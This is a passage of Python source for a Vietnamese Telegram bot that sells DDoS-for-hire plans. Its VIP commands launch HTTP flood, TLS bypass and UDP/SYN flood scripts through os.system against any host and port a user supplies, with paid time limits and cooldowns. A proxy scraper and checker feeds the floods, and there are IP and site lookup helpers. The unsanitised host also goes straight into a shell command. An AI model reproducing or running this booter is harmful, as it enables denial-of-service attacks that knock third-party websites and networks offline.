            bot.reply_to(message, "❌ Không thể kết nối tới API.")
            return

        data = response.json()

        # Kiểm tra dữ liệu trả về
        if not data or data.get("error"):
            bot.reply_to(message, "❌ Không tìm thấy thông tin từ link đã nhập.")
            return

        # Lấy thông tin từ API
        title = data["data"].get("title", "Không xác định")
        author = data["data"].get("author", "Không xác định")
        medias = data["data"].get("medias", [])

        # Sắp xếp các video theo chất lượng (ưu tiên từ cao xuống thấp)
        video_url = None
        quality_priority = ["hd_no_watermark", "no_watermark", "watermark"]

        for quality in quality_priority:
            for media in medias:
                if media["type"] == "video" and media["quality"] == quality:
                    video_url = media["url"]
                    break
            if video_url:
                break

        if video_url:
            # Gửi video với chất lượng cao nhất tìm được
            try:
                bot.send_video(
                    message.chat.id,
                    video_url,
                    caption=f"🎬 **{title}**\n👤 **Tác Giả:** {author}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Lỗi khi gửi video: {str(e)}")
                bot.reply_to(
                    message,
                    f"❌ Không thể gửi video trực tiếp. Bạn có thể tải video tại: [Link video]({video_url})",
                    parse_mode="Markdown"
                )
        else:
            bot.reply_to(message, "❌ Không tìm thấy video phù hợp để tải.")
    except Exception as e:
        print(f"Lỗi không mong muốn: {str(e)}")
        bot.reply_to(message, f"❌ Đã xảy ra lỗi")

ADMIN_ID1 = ["6033886040"]
VIP_FILE = "vip.json"

if not os.path.exists(VIP_FILE):
    with open(VIP_FILE, "w") as f:
        json.dump({}, f)

def load_vip():
    with open(VIP_FILE, "r") as f:
        return json.load(f)

def save_vip(data):
    with open(VIP_FILE, "w") as f:
        json.dump(data, f, indent=4)

def check_vip(user_id):
    vip_data = load_vip()
    return str(user_id) in vip_data

def get_user_plan(user_id):
    vip_data = load_vip()
    return vip_data.get(str(user_id), None)

def check_cooldown(user_id, attack_type):
    if user_id in cooldowns and attack_type in cooldowns[user_id]:
        remaining = cooldowns[user_id][attack_type] - time.time()
        if remaining > 0:
            return int(remaining)
    return 0

def set_cooldown(user_id, attack_type, cooldown):
    if user_id not in cooldowns:
        cooldowns[user_id] = {}
    cooldowns[user_id][attack_type] = time.time() + cooldown

@bot.message_handler(commands=["ngocdoian"])
def start(message):
    user = message.from_user.username
    caption = f"""
<b>
● Welcome to '@{user}' Back to Henry Private New Version
● Update big?
➥ New power: Powerful Layer 4-7 | New network power coming
➥ New themes: Updated private bot banner theme

➖➖➖➖➖➖➖➖➖➖➖➖
● Lệnh khác:
➥ /rules1: Xem quy tắc bot
➥ /plan1: Kiểm tra gói của bạn

➖➖➖➖➖➖➖➖➖➖➖➖
● Lệnh tấn công gói VIP:
➥ /flooder1: [VIP-PLAN] RawFlood
➥ /bypasser1: [VIP-PLAN] Bypass HTTP/2
➥ /l4_v1: [VIP-PLAN] Tấn công TCP SYN flood

➖➖➖➖➖➖➖➖➖➖➖➖
● Lệnh miễn phí hoặc (VIP):
➥ /web1: [FREE-PLAN] Lấy thông tin trang web
➥ /ip1: [FREE-PLAN] Lấy thông tin IP
➥ /proxy1: [FREE-PLAN] Lấy proxy HTTP/s

➖➖➖➖➖➖➖➖➖➖➖➖
● Lệnh quản trị viên:
➥ /new_plan1: [ADMIN] Thêm gói VIP
➥ /rm_plan1: [ADMIN] Xóa gói VIP
➥ /server1: [ADMIN] Xem trạng thái máy chủ
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/j2lg0n.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["rules1"])
def rules(message):
    caption = """
<b>
● Rules The Bot 
➖➖➖➖➖➖➖➖➖➖➖➖
➥ Không tấn công các trang web của chính phủ hoặc giáo dục.
➥ Không chia sẻ gói của bạn với người khác.
➥ Sử dụng bot sai mục đích sẽ dẫn đến lệnh cấm vĩnh viễn.
➥ Các cuộc tấn công chỉ nhằm mục đích thử nghiệm.
➥ Không hoàn lại tiền sau khi mua gói.
➥ Tuân thủ nghiêm ngặt mọi điều khoản và điều kiện.

➥ Thank you for using the bot.
</b>
"""
    bot.send_photo(message.chat.id, "https://files.catbox.moe/v03i8b.jpeg", caption=caption, parse_mode="HTML")


@bot.message_handler(commands=["plan1"])
def plan(message):
    user = message.from_user.username
    user_id = message.from_user.id

    if check_vip(user_id):
        plan_data = get_user_plan(user_id)
        caption = f"""
<b>
● Your Plan The Bot Laucher
➖➖➖➖➖➖➖➖➖➖➖➖
➥ Username: @{user}
➥ MaxTime: {plan_data["MaxTime"]}
➥ Cooldown: {plan_data["Cooldown"]}
➖➖➖➖➖➖➖➖➖➖➖➖
● Thank to using bot
</b>
"""
    else:
        caption = "<blockquote>• Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>"
    
    bot.send_animation(message.chat.id, "https://files.catbox.moe/e14wss.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["bypasser1"])
def l7(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /bypasser [Host] [Port] [Time]")
        return

    user_id = message.from_user.id
    if not check_vip(user_id):
        bot.send_message(message.chat.id, "<blockquote>• Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>", parse_mode="HTML")
        return

    plan = get_user_plan(user_id)
    host, port, time_attack = args[1], args[2], int(args[3])

    if time_attack > plan["MaxTime"]:
        bot.send_message(message.chat.id, f"<blockquote>• Enter Time From '30 to {plan['MaxTime']}' thank you</blockquote>", parse_mode="HTML")
        return

    cooldown_time = check_cooldown(user_id, "bypasser")
    if cooldown_time > 0:
        bot.send_message(message.chat.id, f"<blockquote>• Please wait '{cooldown_time} seconds' to use again</blockquote>", parse_mode="HTML")
        return

    os.system(f"screen -dmS attack node tls {host} {time_attack} 17 3 http.txt")
    set_cooldown(user_id, "bypasser", plan["Cooldown"])

    caption = f"""
<b>
● Your attack beling is laucher
➥ Host: {host}
➥ Port: {port}
➥ Time: {time_attack}
➥ Method: .bypasser
➖➖➖➖➖➖➖➖➖➖➖➖
● Your plan:
➥ Username: @{message.from_user.username}
➥ MaxTime: {plan["MaxTime"]}
➥ Cooldown: {plan["Cooldown"]}
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/nz3282.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["flooder1"])
def l7(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /flooder [Host] [Port] [Time]")
        return

    user_id = message.from_user.id
    if not check_vip(user_id):
        bot.send_message(message.chat.id, "<blockquote>• Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>", parse_mode="HTML")
        return

    plan = get_user_plan(user_id)
    host, port, time_attack = args[1], args[2], int(args[3])

    if time_attack > plan["MaxTime"]:
        bot.send_message(message.chat.id, f"<blockquote>• Enter Time From '30 to {plan['MaxTime']}' thank you</blockquote>", parse_mode="HTML")
        return

    cooldown_time = check_cooldown(user_id, "flooder")
    if cooldown_time > 0:
        bot.send_message(message.chat.id, f"<blockquote>• Please wait '{cooldown_time} seconds' to use again</blockquote>", parse_mode="HTML")
        return

    os.system(f"screen -dmS attack node tls {host} {time_attack} 32 4 http.txt")
    set_cooldown(user_id, "flooder", plan["Cooldown"])

    caption = f"""
<b>
● Your attack beling is laucher
➥ Host: {host}
➥ Port: {port}
➥ Time: {time_attack}
➥ Method: .flooder
➖➖➖➖➖➖➖➖➖➖➖➖
● Your plan:
➥ Username: @{message.from_user.username}
➥ MaxTime: {plan["MaxTime"]}
➥ Cooldown: {plan["Cooldown"]}
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/nz3282.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["l4_v1"])
def l4(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /l4 [IP] [Port] [Time]")
        return

    user_id = message.from_user.id
    if not check_vip(user_id):
        bot.send_message(message.chat.id, "<blockquote>• Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>", parse_mode="HTML")
        return

    plan = get_user_plan(user_id)
    ip, port, time_attack = args[1], args[2], int(args[3])

    if time_attack > plan["MaxTime"]:
        bot.send_message(message.chat.id, f"<blockquote>• Enter Time From '30 to {plan['MaxTime']}' thank you</blockquote>", parse_mode="HTML")
        return

    cooldown_time = check_cooldown(user_id, "l4")
    if cooldown_time > 0:
        bot.send_message(message.chat.id, f"<blockquote>• Please wait '{cooldown_time} seconds' to use again</blockquote>", parse_mode="HTML")
        return

    os.system(f"screen -dmS attack go run udp.go {ip} {port} {time_attack}")
    set_cooldown(user_id, "l4", plan["Cooldown"])

    caption = f"""
<b>
● Your attack beling is laucher
➥ Host: {ip}
➥ Port: {port}
➥ Time: {time_attack}
➥ Method: .goodudp
➖➖➖➖➖➖➖➖➖➖➖➖
● Your plan:
➥ Username: @{message.from_user.username}
➥ MaxTime: {plan["MaxTime"]}
➥ Cooldown: {plan["Cooldown"]}
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/nz3282.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["web1", "webstatus1"])
def web_status(message):
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "<b>Usage:</b> /web [URL]", parse_mode="HTML")
        return

    url = args[1]
    image_path = "image.jpg"
    
    if os.path.exists(image_path):
        os.remove(image_path)

    subprocess.run(["screen", "-dmS", "capture", "python3", "cap.py", url])

    time.sleep(10)

    if not os.path.exists(image_path):
        bot.send_message(message.chat.id, f"<b>• {url} is unreachable.</b>", parse_mode="HTML")
        return

    try:
        domain = url.replace("http://", "").replace("https://", "").split("/")[0]
        ip_address = socket.gethostbyname(domain)

        response = requests.get(url, timeout=5)
        status = response.status_code
        response_time = round(response.elapsed.total_seconds(), 2)
        soup = BeautifulSoup(response.text, "html.parser")
        title = soup.title.string if soup.title else "Unknown"

        ip_api = requests.get(f"http://ip-api.com/json/{ip_address}").json()
        isp = ip_api.get("isp", "Unknown")
        org = ip_api.get("org", "Unknown")
        country = ip_api.get("country", "Unknown")
        timezone = ip_api.get("timezone", "Unknown")

        caption = f"""
<b>
● Url Info
➖➖➖➖➖➖➖➖➖➖➖➖
➥ Host: {url}
➥ Title: {title}
➥ Status: {status}
➥ Response Time: {response_time} seconds
➖➖➖➖➖➖➖➖➖➖➖➖
➥ IP: {ip_address}
➥ ISP: {isp}
➥ Org: {org}
➥ Country: {country}
➥ Timezone: {timezone}
</b>
""" if status == 200 else f"<b>Fail Checker:</b> {url} is down. Status: {status}"

        with open(image_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo, caption=caption, parse_mode="HTML")

    except Exception:
        bot.send_message(message.chat.id, f"<b>• {url} is unreachable.</b>", parse_mode="HTML")

    finally:
        if os.path.exists(image_path):
            os.remove(image_path)

@bot.message_handler(commands=["ip1"])
def check_ip(message):
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "<b>Usage: /ip [IP]</b>", parse_mode="HTML")
        return

    ip = args[1]
    response = requests.get(f"http://ip-api.com/json/{ip}").json()
    
    if response["status"] == "fail":
        caption = "<b>• Invalid IP address.</b>"
    else:
        caption = f"""
<b>
● IP Lookup:
➖➖➖➖➖➖➖➖➖➖➖➖
➥ IP: {ip}
➥ Country: {response["country"]}
➥ Region: {response["regionName"]}
➥ City: {response["city"]}
➥ ISP: {response["isp"]}
➥ Org: {response["org"]}
➥ Lat/Lon: {response["lat"]}, {response["lon"]}
➖➖➖➖➖➖➖➖➖➖➖➖
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/7sn07u.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["new_plan"])
def new_plan(message):
    if str(message.from_user.id) not in ADMIN_ID1:
        return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /new_plan [ID] [MaxTime] [Cooldown]")
        return

    user_id, max_time, cooldown = args[1], int(args[2]), int(args[3])
    vip_data = load_vip()
    vip_data[user_id] = {"MaxTime": max_time, "Cooldown": cooldown}
    save_vip(vip_data)

    bot.send_message(message.chat.id, f"• Success add New Plan: ID: {user_id} | MaxTime: {max_time} | Cooldown: {cooldown}")

@bot.message_handler(commands=["rm_plan1"])
def rm_plan(message):
    if str(message.from_user.id) not in ADMIN_ID1:
        return

    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "Usage: /rm_plan [ID]")
        return

    user_id = args[1]
    vip_data = load_vip()
    vip_data.pop(user_id, None)
    save_vip(vip_data)

    bot.send_message(message.chat.id, f"• Removed ID: {user_id}")

GIF_URL = "https://files.catbox.moe/7bjfud.gif"

import platform

def get_server_status(message):
    uptime = time.time() - psutil.boot_time()
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
    
    system = platform.system()
    release = platform.release()
    version = platform.version()
    arch = platform.architecture()[0]
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    cpu_freq = psutil.cpu_freq().max if psutil.cpu_freq() else 0
    cpu_cores = os.cpu_count()
    cpu_usage = psutil.cpu_percent()

    ram = psutil.virtual_memory()
    ram_total = round(ram.total / (1024**3), 2)
    ram_used = round(ram.used / (1024**3), 2)

    disk = psutil.disk_usage('/')
    disk_total = round(disk.total / (1024**3), 2)
    disk_used = round(disk.used / (1024**3), 2)
    disk_percent = disk.percent

    net_io = psutil.net_io_counters()
    net_sent = net_io.bytes_sent / (1024**2)
    net_recv = net_io.bytes_recv / (1024**2)

    status = f"""
● Server Status:
➖➖➖➖➖➖➖➖➖➖➖➖
➥ OS: {system} {release} ({arch})
➥ OS Version: {version}
➥ Uptime: {uptime_str}
➖➖➖➖➖➖➖➖➖➖➖➖
➥ CPU: {cpu_cores} Cores - {cpu_freq:.2f} MHz
➥ CPU Usage: {cpu_usage}%
➥ RAM: {ram_used} / {ram_total} GB
➥ Disk: {disk_used} / {disk_total} GB ({disk_percent}% used)
➥ Network: {net_sent:.2f}MB Sent / {net_recv:.2f}MB Received
➖➖➖➖➖➖➖➖➖➖➖➖
"""

    if str(message.from_user.id) in ADMIN_ID1:
        status = status.replace("●", "<b>●</b>").replace("➥", "<b>➥</b>")

    return status

@bot.message_handler(commands=['server1'])
def server_status(message):
    status = get_server_status(message)
    bot.send_animation(message.chat.id, GIF_URL, caption=status, parse_mode="HTML" if str(message.from_user.id) in ADMIN_ID1 else None)

proxy_sources = [
'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all',

'https://proxyspace.pro/https.txt'

]

def fetch_proxies():
    proxies = set()
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                proxies.update(response.text.strip().split("\n"))
        except:
            pass
    return list(proxies)

def check_proxy(proxy):
    try:
        response = requests.get(f"http://ip-api.com/json/{proxy.split(':')[0]}?fields=country", timeout=1)
        if response.status_code == 200:
            country = response.json().get("country", "Unknown")
            return proxy, country
    except:
        return None

def check_proxies(proxies, msg, chat_id):
    total = len(proxies)
    good_proxies = []
    bad_count = 0
    country_count = Counter()
    lock = threading.Lock()

    def worker(proxy):
        nonlocal bad_count
        result = check_proxy(proxy)
        if result:
            with lock:
                good_proxies.append(result[0])
                country_count[result[1]] += 1
        else:
            with lock:
                bad_count += 1

    threads = []
    for proxy in proxies:
        thread = threading.Thread(target=worker, args=(proxy,))
        thread.start()
        threads.append(thread)

        if len(threads) >= 10000:
            for t in threads:
                t.join()
            threads = []
            progress = ((len(good_proxies) + bad_count) / total) * 100
            bot.edit_message_text(f"<b>➥ Start Checker Proxy {progress:.2f}%</b>", chat_id, msg.message_id, parse_mode="HTML")
            time.sleep(7)

    for t in threads:
        t.join()

    file_id = random.randint(10000, 99999)
    filename = f"good_proxy_{file_id}.txt"

    with open(filename, "w") as f:
        f.write("\n".join(good_proxies))

    caption = f"<b>[🧬] Successfully Proxy:</b>\n\n<b>➥ Total:</b> {total}\n<b>➥ Good:</b> {len(good_proxies)}\n<b>➥ Bad:</b> {bad_count}\n\n<b>➥ Country:</b>\n➖➖➖➖➖➖➖➖➖➖➖➖\n"
    for country, count in country_count.items():
        caption += f"<b>● {country}:</b> {count}\n"

    for i in range(msg.message_id, msg.message_id - 10, -1):
        try:
            bot.delete_message(chat_id, i)
        except:
            pass

    gif_url = "https://files.catbox.moe/axf9wn.gif"
    msg = bot.send_animation(chat_id, gif_url, caption=caption, parse_mode="HTML")
    
    bot.send_document(chat_id, open(filename, "rb"), reply_to_message_id=msg.message_id)

    os.remove(filename)

@bot.message_handler(commands=['proxy1'])
def proxy_handler(message):
    chat_id = message.chat.id
    loading_msg = bot.send_message(chat_id, "<b>[🔫] Fetching proxies, Please wait </b>", parse_mode="HTML")
    proxies = fetch_proxies()
    bot.delete_message(chat_id, loading_msg.message_id)

    if not proxies:
        bot.send_message(chat_id, "<b>➥ No new proxies found!</b>", parse_mode="HTML")
        return

    bot.send_message(chat_id, f"<b>➥ Successfully Fetch Proxy: {len(proxies)}</b>", parse_mode="HTML")
    msg = bot.send_message(chat_id, "<b>➥ Start Checker Proxy 0%</b>", parse_mode="HTML")
    check_proxies(proxies, msg, chat_id)

@bot.message_handler(func=lambda message: message.reply_to_message and message.reply_to_message.from_user.id == bot.get_me().id)
def continue_gemini_conversation(message):
    user_id = message.from_user.id
    # Lấy nội dung tin nhắn reply
    input_text = message.text.strip()
    # Thêm tin nhắn của người dùng vào lịch sử cuộc trò chuyện
    conversation_history[user_id].append({"role": "user", "content": input_text})
    # Gọi API và trả lời người dùng
    send_to_gemini_api(message, user_id, input_text)
def send_to_gemini_api(message, user_id, input_text):
    # Tạo payload JSON với lịch sử cuộc trò chuyện
    payload = {
        "contents": [
            {
                "parts": [{"text": msg["content"]} for msg in conversation_history[user_id]]  # Lưu tất cả tin nhắn trong cuộc hội thoại
            }
        ]
    }
    headers = {
        'Content-Type': 'application/json'
    }
    try:
        # Gửi yêu cầu POST tới API Gemini
        response = requests.post(f'{BASE_URL}?key={API_KEY}', headers=headers, json=payload)
        # Kiểm tra và xử lý phản hồi
        if response.status_code == 200:
            data = response.json()
            # Trích xuất phần text của model từ phản hồi
            text_response = data['candidates'][0]['content']['parts'][0]['text']
            # Trả lời người dùng và giữ lại cuộc hội thoại
            sent_message = bot.reply_to(message, f"{text_response}")
            # Thêm câu trả lời của model vào lịch sử
            conversation_history[user_id].append({"role": "model", "content": text_response})
        else:
            error_message = response.json().get('error', {}).get('message', 'Không thể lấy dữ liệu.')
            bot.reply_to(message, f"Lỗi: {error_message}")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi kết nối API: {str(e)}")
    except Exception as e:
        bot.reply_to(message, f"Lỗi không xác định")

# Xóa webhook trước khi sử dụng polling
bot.remove_webhook()
print("Webhook đã bị xóa!")

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
